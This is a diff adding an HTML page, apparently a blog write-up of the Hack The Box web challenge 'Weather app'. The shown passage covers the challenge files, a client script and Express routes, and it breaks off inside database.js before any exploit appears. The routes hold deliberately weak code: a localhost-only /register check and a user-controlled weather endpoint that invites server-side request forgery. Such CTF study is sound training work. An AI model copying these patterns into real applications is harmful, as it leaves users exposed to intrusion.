@@ -1,0 +1,558 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>Weather app - Flavien Jaquerod</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="HTB writeup for the easy web challenge &#34;Weather app&#34;">
+		<meta property="og:url" content="http://localhost:1313/posts/weather-app/">
+  <meta property="og:site_name" content="Flavien Jaquerod">
+  <meta property="og:title" content="Weather app">
+  <meta property="og:description" content="HTB writeup for the easy web challenge &#34;Weather app&#34;">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-02-05T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-02-05T00:00:00+00:00">
+    <meta property="article:tag" content="CTF">
+    <meta property="article:tag" content="HTB">
+    <meta property="article:tag" content="Challenge">
+    <meta property="article:tag" content="Web">
+    <meta property="article:tag" content="Veasy">
+    <meta property="article:tag" content="Smuggling">
+
+		
+  <meta itemprop="name" content="Weather app">
+  <meta itemprop="description" content="HTB writeup for the easy web challenge &#34;Weather app&#34;">
+  <meta itemprop="datePublished" content="2025-02-05T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2025-02-05T00:00:00+00:00">
+  <meta itemprop="wordCount" content="1441">
+  <meta itemprop="keywords" content="CTF,HTB,Challenge,Web,Veasy,Smuggling,SSRF">
+		
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Weather app">
+  <meta name="twitter:description" content="HTB writeup for the easy web challenge &#34;Weather app&#34;">
+
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link rel="dns-prefetch" href="//fonts.googleapis.com">
+	<link rel="dns-prefetch" href="//fonts.gstatic.com">
+	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">
+
+	<link rel="stylesheet" href="/css/style.css">
+	<link rel="stylesheet" href="/css/custom.css">
+
+	<link rel="shortcut icon" href="/favicon.ico">
+		
+</head>
+<body class="body">
+	<div class="container container--outer">
+		<header class="header">
+	<div class="container header__container">
+		
+	<div class="logo logo--mixed">
+		<a class="logo__link" href="/" title="A bunch of cybersecurity stuff" rel="home">
+			<div class="logo__item logo__imagebox">
+					<img class="logo__img" src="/img/Icon.webp">
+				</div><div class="logo__item logo__text">
+					<div class="logo__title">A bunch of cybersecurity stuff</div>
+					<div class="logo__tagline">ZeroDay Chronicles</div>
+				</div>
+		</a>
+	</div>
+		
+<nav class="menu">
+	<button class="menu__btn" aria-haspopup="true" aria-expanded="false" tabindex="0">
+		<span class="menu__btn-title" tabindex="-1">Menu</span>
+	</button>
+	<ul class="menu__list">
+		<li class="menu__item">
+			<a class="menu__link" href="/">
+				
+				<span class="menu__text">Home</span>
+				
+			</a>
+		</li>
+		<li class="menu__item">
+			<a class="menu__link" href="/about/">
+				
+				<span class="menu__text">About</span>
+				
+			</a>
+		</li>
+		<li class="menu__item">
+			<a class="menu__link" href="/posts/">
+				
+				<span class="menu__text">Posts</span>
+				
+			</a>
+		</li>
+		<li class="menu__item">
+			<a class="menu__link" href="/news/">
+				
+				<span class="menu__text">News</span>
+				
+			</a>
+		</li>
+		<li class="menu__item">
+			<a class="menu__link" href="/cheatsheets/">
+				
+				<span class="menu__text">Cheat Sheets</span>
+				
+			</a>
+		</li>
+	</ul>
+</nav>
+
+	</div>
+</header>
+		<div class="wrapper flex">
+			<div class="primary">
+			
+<main class="main" role="main">
+	<article class="post">
+		<header class="post__header">
+			<h1 class="post__title">Weather app</h1>
+			<div class="post__meta meta"><div class="meta__item-author meta__item">
+	<svg class="meta__icon icon icon-author" width="16" height="16" viewBox="0 0 16 16"><path d="M8 1c2 0 3.5 2 3.5 4.5S10 9 10 9c3 1 4 2 4 6H2c0-4 1-5 4-6 0 0-1.5-1-1.5-3.5S6 1 8 1"/></svg><span class="meta__text">Flavien Jaquerod</span>
+</div>
+<div class="meta__item-datetime meta__item">
+	<svg class="meta__icon icon icon-time" width="16" height="14" viewBox="0 0 30 28"><path d="M15 0a14 14 0 1 1 0 28 1 1 0 0 1 0-28m0 3a3 3 0 1 0 0 22 3 3 0 0 0 0-22m1 4h-2v8.4l6.8 4.4L22 18l-6-3.8z"/></svg><time class="meta__text" datetime="2025-02-05T00:00:00Z">2025-02-05</time></div><div class="meta__item-categories meta__item"><svg class="meta__icon icon icon-category" width="16" height="16" viewBox="0 0 16 16"><path d="m7 2 1 2h8v11H0V2z"/></svg><span class="meta__text"><a class="meta__link" href="/categories/writeup/" rel="category">Writeup</a>, <a class="meta__link" href="/categories/challenge/" rel="category">Challenge</a>, <a class="meta__link" href="/categories/web/" rel="category">Web</a>
+	</span>
+</div></div>
+		</header>
+		<div class="content post__content clearfix">
+			<pre tabindex="0"><code>A pit of eternal darkness, a mindless journey of abeyance, this feels like a never-ending dream. I think I&#39;m hallucinating with the memories of my past life, it&#39;s a reflection of how thought I would have turned out if I had tried enough. A weatherman, I said! Someone my community would look up to, someone who is to be respected. I guess this is my way of telling you that I&#39;ve been waiting for someone to come and save me. This weather application is notorious for trapping the souls of ambitious weathermen like me. Please defeat the evil bruxa that&#39;s operating this website and set me free! 🧙‍♀️
+</code></pre><p>==&gt; For this challenge we get a live instance as well as a bunch of files:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>├── Dockerfile
+</span></span><span style="display:flex;"><span>├── build-docker.sh
+</span></span><span style="display:flex;"><span>├── challenge
+</span></span><span style="display:flex;"><span>│   ├── database.js
+</span></span><span style="display:flex;"><span>│   ├── flag
+</span></span><span style="display:flex;"><span>│   ├── helpers
+</span></span><span style="display:flex;"><span>│   │   ├── HttpHelper.js
+</span></span><span style="display:flex;"><span>│   │   └── WeatherHelper.js
+</span></span><span style="display:flex;"><span>│   ├── index.js
+</span></span><span style="display:flex;"><span>│   ├── package-lock.json
+</span></span><span style="display:flex;"><span>│   ├── package.json
+</span></span><span style="display:flex;"><span>│   ├── routes
+</span></span><span style="display:flex;"><span>│   │   └── index.js
+</span></span><span style="display:flex;"><span>│   ├── static
+</span></span><span style="display:flex;"><span>│   │   ├── css
+</span></span><span style="display:flex;"><span>│   │   │   └── main.css
+</span></span><span style="display:flex;"><span>│   │   ├── favicon.gif
+</span></span><span style="display:flex;"><span>│   │   ├── host-unreachable.jpg
+</span></span><span style="display:flex;"><span>│   │   ├── js
+</span></span><span style="display:flex;"><span>│   │   │   ├── koulis.js
+</span></span><span style="display:flex;"><span>│   │   │   └── main.js
+</span></span><span style="display:flex;"><span>│   │   ├── koulis.gif
+</span></span><span style="display:flex;"><span>│   │   └── weather.gif
+</span></span><span style="display:flex;"><span>│   ├── views
+</span></span><span style="display:flex;"><span>│   │   ├── index.html
+</span></span><span style="display:flex;"><span>│   │   ├── login.html
+</span></span><span style="display:flex;"><span>│   │   └── register.html
+</span></span><span style="display:flex;"><span>│   └── weather-app.db
+</span></span><span style="display:flex;"><span>└── config
+</span></span><span style="display:flex;"><span>    └── supervisord.conf
+</span></span></code></pre></div><p>==&gt; Going over to the website, we see it displays the weather for a specific city (<code>Bienne</code>in that case) but there does not seem to be any way for us to interact with it. Checking out the source code we see this <code>main.js</code>file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">weather</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;weather&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">getWeather</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">async</span> () =&gt; {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">endpoint</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;api.openweathermap.org&#39;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">res</span>  <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;//ip-api.com/json/&#39;</span>)
+</span></span><span style="display:flex;"><span>        .<span style="color:#66d9ef">catch</span>(() =&gt; {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">weather</span>.<span style="color:#a6e22e">innerHTML</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                &lt;img src=&#39;/static/host-unreachable.jpg&#39;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                &lt;br&gt;&lt;br&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                &lt;h4&gt;👨‍🔧 Disable blocker addons&lt;/h2&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            `</span>;
+</span></span><span style="display:flex;"><span>        });
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">data</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> { <span style="color:#a6e22e">countryCode</span>, <span style="color:#a6e22e">city</span> } <span style="color:#f92672">=</span> <span style="color:#a6e22e">data</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;/api/weather&#39;</span>, {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;POST&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">body</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>({
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">endpoint</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">endpoint</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">city</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">city</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">country</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">countryCode</span>,
+</span></span><span style="display:flex;"><span>        }),
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;Content-Type&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;application/json&#39;</span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    });
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">data</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">temp</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">weather</span>.<span style="color:#a6e22e">innerHTML</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            &lt;div class=&#39;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">icon</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;&gt;&lt;/div&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            &lt;h1&gt;City: </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">city</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&lt;/h1&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            &lt;h1&gt;Temp: </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">temp</span><span style="color:#e6db74">}</span><span style="color:#e6db74"> C&lt;/h1&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            &lt;h3&gt;Status: </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">desc</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&lt;/h3&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        `</span>;
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">weather</span>.<span style="color:#a6e22e">innerHTML</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            &lt;h3&gt;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">message</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&lt;/h3&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        `</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">getWeather</span>();
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">setInterval</span>(<span style="color:#a6e22e">getWeather</span>, <span style="color:#ae81ff">60</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">60</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">1000</span>);
+</span></span></code></pre></div><p>and we discover the <code>/api/weather</code>endpoint but nothing else that seems really interesting.</p>
+<p>==&gt; Looking for the <code>flag</code>keyword in the entire directory, we find an occurrence in <code>/routes/index.js</code>and can check it out:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">path</span>              <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;path&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">fs</span>                <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;fs&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">express</span>           <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;express&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">router</span>            <span style="color:#f92672">=</span> <span style="color:#a6e22e">express</span>.<span style="color:#a6e22e">Router</span>();
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">WeatherHelper</span>     <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;../helpers/WeatherHelper&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">db</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">response</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">data</span> =&gt; ({ <span style="color:#a6e22e">message</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">data</span> });
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">router</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">sendFile</span>(<span style="color:#a6e22e">path</span>.<span style="color:#a6e22e">resolve</span>(<span style="color:#e6db74">&#39;views/index.html&#39;</span>));
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">router</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/register&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">sendFile</span>(<span style="color:#a6e22e">path</span>.<span style="color:#a6e22e">resolve</span>(<span style="color:#e6db74">&#39;views/register.html&#39;</span>));
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">router</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;/register&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">socket</span>.<span style="color:#a6e22e">remoteAddress</span>.<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">/^.*:/</span>, <span style="color:#e6db74">&#39;&#39;</span>) <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;127.0.0.1&#39;</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">401</span>).<span style="color:#a6e22e">end</span>();
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> { <span style="color:#a6e22e">username</span>, <span style="color:#a6e22e">password</span> } <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">username</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">password</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">register</span>(<span style="color:#a6e22e">username</span>, <span style="color:#a6e22e">password</span>)
+</span></span><span style="display:flex;"><span>                        .<span style="color:#a6e22e">then</span>(()  =&gt; <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">response</span>(<span style="color:#e6db74">&#39;Successfully registered&#39;</span>)))
+</span></span><span style="display:flex;"><span>                        .<span style="color:#66d9ef">catch</span>(() =&gt; <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">response</span>(<span style="color:#e6db74">&#39;Something went wrong&#39;</span>)));
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">response</span>(<span style="color:#e6db74">&#39;Missing parameters&#39;</span>));
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">router</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/login&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">sendFile</span>(<span style="color:#a6e22e">path</span>.<span style="color:#a6e22e">resolve</span>(<span style="color:#e6db74">&#39;views/login.html&#39;</span>));
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">router</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;/login&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> { <span style="color:#a6e22e">username</span>, <span style="color:#a6e22e">password</span> } <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">username</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">password</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">isAdmin</span>(<span style="color:#a6e22e">username</span>, <span style="color:#a6e22e">password</span>)
+</span></span><span style="display:flex;"><span>                        .<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">admin</span> =&gt; {
+</span></span><span style="display:flex;"><span>                                <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">admin</span>) <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">readFileSync</span>(<span style="color:#e6db74">&#39;/app/flag&#39;</span>).<span style="color:#a6e22e">toString</span>());
+</span></span><span style="display:flex;"><span>                                <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">response</span>(<span style="color:#e6db74">&#39;You are not admin&#39;</span>));
+</span></span><span style="display:flex;"><span>                        })
+</span></span><span style="display:flex;"><span>                        .<span style="color:#66d9ef">catch</span>(() =&gt; <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">response</span>(<span style="color:#e6db74">&#39;Something went wrong&#39;</span>)));
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">re</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">response</span>(<span style="color:#e6db74">&#39;Missing parameters&#39;</span>));
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">router</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;/api/weather&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> { <span style="color:#a6e22e">endpoint</span>, <span style="color:#a6e22e">city</span>, <span style="color:#a6e22e">country</span> } <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">endpoint</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">city</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">country</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">WeatherHelper</span>.<span style="color:#a6e22e">getWeather</span>(<span style="color:#a6e22e">res</span>, <span style="color:#a6e22e">endpoint</span>, <span style="color:#a6e22e">city</span>, <span style="color:#a6e22e">country</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">response</span>(<span style="color:#e6db74">&#39;Missing parameters&#39;</span>));
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">module</span>.<span style="color:#a6e22e">exports</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">database</span> =&gt; { 
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">db</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">database</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">router</span>;
+</span></span><span style="display:flex;"><span>};               
+</span></span></code></pre></div><p>and so there is a <code>/login</code>endpoint that we can immediately go to. Trying to login as <code>admin</code>does not work for now so we can register a user first under the <code>/register</code>endpoint but it does not seem to work as the requests need to be coming from <code>localhost</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">router</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;/register&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">socket</span>.<span style="color:#a6e22e">remoteAddress</span>.<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">/^.*:/</span>, <span style="color:#e6db74">&#39;&#39;</span>) <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;127.0.0.1&#39;</span>) {
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">401</span>).<span style="color:#a6e22e">end</span>();
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">let</span> { <span style="color:#a6e22e">username</span>, <span style="color:#a6e22e">password</span> } <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">username</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">password</span>) {
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">register</span>(<span style="color:#a6e22e">username</span>, <span style="color:#a6e22e">password</span>)
+</span></span><span style="display:flex;"><span>					.<span style="color:#a6e22e">then</span>(()  =&gt; <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">response</span>(<span style="color:#e6db74">&#39;Successfully registered&#39;</span>)))
+</span></span><span style="display:flex;"><span>					.<span style="color:#66d9ef">catch</span>(() =&gt; <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">response</span>(<span style="color:#e6db74">&#39;Something went wrong&#39;</span>)));
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">response</span>(<span style="color:#e6db74">&#39;Missing parameters&#39;</span>));
+</span></span><span style="display:flex;"><span>});
+</span></span></code></pre></div><p>==&gt; We can then check the <code>database.js</code>file and see what it contains:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">sqlite</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;sqlite-async&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">crypto</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;crypto&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Database</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">constructor</span>(<span style="color:#a6e22e">db_file</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">db_file</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">db_file</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">db</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">undefined</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">async</span> <span style="color:#a6e22e">connect</span>() {
